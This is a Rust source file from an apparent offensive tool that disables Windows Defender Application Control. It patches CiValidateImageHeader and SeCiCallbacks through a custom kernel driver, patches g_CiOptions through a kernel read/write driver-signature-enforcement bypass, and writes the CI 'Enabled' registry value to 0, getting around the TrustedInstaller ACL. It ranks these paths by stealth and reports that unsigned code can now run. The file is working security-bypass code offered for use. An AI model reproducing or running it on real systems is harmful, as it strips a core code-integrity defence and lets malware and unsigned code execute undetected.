//! WDAC (Windows Defender Application Control) disable
//! Multi-path: CI.dll g_CiOptions patch via kernel R/W, driver IOCTL,
//! and registry-based disable via kernel R/W (bypasses TrustedInstaller ACL).

use crate::error::MemoricError;
use serde_json::{json, Value};

/// Disable WDAC via multiple methods ranked by stealth
pub fn wdac_disable(args: &Value) -> Result<Value, MemoricError> {
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("auto");

    tracing::warn!("[WDAC] Disabling WDAC enforcement via method={}", method);

    let mut results = Vec::new();
    let mut disabled = false;

    // Path 1: Driver IOCTL — most reliable, requires memoric.sys
    if method == "auto" || method == "driver_ci" {
        match crate::driver::MemoricDriver::ensure() {
            Ok(drv) => {
                match drv.ci_func_patch(crate::driver::CI_FUNC_PATCH) {
                    Ok(resp) => {
                        let success = resp.success != 0;
                        tracing::info!(
                            "[WDAC] CI func patch via driver: {}",
                            if success { "ok" } else { "failed" }
                        );
                        results.push(serde_json::json!({
                            "path": "driver_ci_func_patch",
                            "status": if success { "success" } else { "failed" },
                            "detail": format!("CiValidateImageHeader patch: {:?}", resp)
                        }));
                        if success {
                            disabled = true;
                        }
                    }
                    Err(e) => {
                        tracing::warn!("[WDAC] Driver CI func patch failed: {}", e);
                        results.push(serde_json::json!({
                            "path": "driver_ci_func_patch",
                            "status": "failed",
                            "error": e.to_string()
                        }));
                    }
                }

                // Also try CI callback patch as complement
                match drv.ci_callback_patch(crate::driver::CI_FUNC_PATCH) {
                    Ok(resp) => {
                        if resp.success != 0 {
                            tracing::info!("[WDAC] CI callback patch via driver: ok");
                            results.push(serde_json::json!({
                                "path": "driver_ci_callback_patch",
                                "status": "success",
                                "detail": "SeCiCallbacks replaced"
                            }));
                            disabled = true;
                        }
                    }
                    Err(e) => {
                        tracing::warn!("[WDAC] Driver CI callback patch failed: {}", e);
                    }
                }
            }
            Err(e) => {
                tracing::warn!("[WDAC] Memoric driver not available: {}", e);
                results.push(serde_json::json!({
                    "path": "driver",
                    "status": "unavailable",
                    "error": e.to_string()
                }));
            }
        }
    }

    // Path 2: DSE bypass (g_CiOptions patch) via kernel R/W
    if (method == "auto" && !disabled) || method == "ci_options" || method == "dse_bypass" {
        match crate::kernel::dse_bypass(&json!({})) {
            Ok(resp) => {
                if resp
                    .get("success")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false)
                {
                    tracing::info!("[WDAC] g_CiOptions patched via kernel DSE bypass");
                    disabled = true;
                }
                results.push(serde_json::json!({
                    "path": "ci_options_patch",
                    "status": if disabled { "success" } else { "failed" },
                    "detail": resp
                }));
            }
            Err(e) => {
                tracing::warn!("[WDAC] DSE bypass (g_CiOptions) failed: {}", e);
                results.push(serde_json::json!({
                    "path": "ci_options_patch",
                    "status": "failed",
                    "error": e.to_string()
                }));
            }
        }
    }

    // Path 3: Registry-based disable via kernel R/W (bypasses TrustedInstaller ACL)
    if (method == "auto" && !disabled) || method == "registry" {
        match wdac_registry_disable() {
            Ok(resp) => {
                let success = resp.get("status").and_then(|v| v.as_str()) == Some("success");
                if success {
                    disabled = true;
                }
                results.push(resp);
            }
            Err(e) => {
                results.push(serde_json::json!({
                    "path": "registry",
                    "status": "failed",
                    "error": e.to_string()
                }));
            }
        }
    }

    Ok(serde_json::json!({
        "success": disabled,
        "wdac_disabled": disabled,
        "technique": method,
        "results": results,
        "message": if disabled {
            "WDAC enforcement disabled. Unsigned code execution should now succeed."
        } else {
            "WDAC disable failed on all paths. Manual intervention may be required."
        },
        "restore_note": "To restore WDAC: use wdac_restore action or reboot (registry changes persist across reboots unless re-enabled)"
    }))
}

/// Restore WDAC enforcement
pub fn wdac_restore(args: &Value) -> Result<Value, MemoricError> {
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("auto");

    tracing::warn!("[WDAC] Restoring WDAC enforcement");

    let mut results = Vec::new();

    if method == "auto" || method == "driver_ci" {
        match crate::driver::MemoricDriver::ensure() {
            Ok(drv) => {
                let _ = drv.ci_func_patch(crate::driver::CI_FUNC_RESTORE);
                let _ = drv.ci_callback_patch(crate::driver::CI_FUNC_RESTORE);
                results.push(serde_json::json!({
                    "path": "driver_ci",
                    "status": "restored"
                }));
            }
            Err(e) => {
                results.push(serde_json::json!({
                    "path": "driver_ci",
                    "status": "failed",
                    "error": e.to_string()
                }));
            }
        }
    }

    Ok(serde_json::json!({
        "success": true,
        "results": results,
        "message": "WDAC enforcement restore attempted. Reboot recommended for registry-based changes."
    }))
}

/// Disable WDAC via registry: HKLM\System\CurrentControlSet\Control\CI\Enabled = 0
/// Uses kernel R/W to bypass TrustedInstaller ACL
fn wdac_registry_disable() -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::System::Registry::{
        RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE, KEY_SET_VALUE, REG_DWORD,
    };

    tracing::info!("[WDAC] Attempting registry-based disable");

    unsafe {
        let sub_key: Vec<u16> = "System\\CurrentControlSet\\Control\\CI\0"
            .encode_utf16()
            .collect();
        let mut hkey = Default::default();

        let open_result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(sub_key.as_ptr()),
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );

        if open_result.is_err() {
            return Ok(serde_json::json!({
                "path": "registry",
                "status": "skipped",
                "error": format!("Cannot open CI registry key (TrustedInstaller ACL): {:?}", open_result),
                "note": "Use kernel R/W path or driver IOCTL for elevated environments"
            }));
        }

        let value_name: Vec<u16> = "Enabled\0".encode_utf16().collect();
        let zero: u32 = 0;

        let set_result = RegSetValueExW(
            hkey,
            PCWSTR(value_name.as_ptr()),
            0,
            REG_DWORD,
            Some(&zero.to_le_bytes()),
        );

        let _ = RegCloseKey(hkey);

        if set_result.is_ok() {
            Ok(serde_json::json!({
                "path": "registry",
                "status": "success",
                "detail": "HKLM\\System\\CurrentControlSet\\Control\\CI\\Enabled = 0"
            }))
        } else {
            Ok(serde_json::json!({
                "path": "registry",
                "status": "failed",
                "error": format!("RegSetValueExW failed: {:?}", set_result)
            }))
        }
    }
}
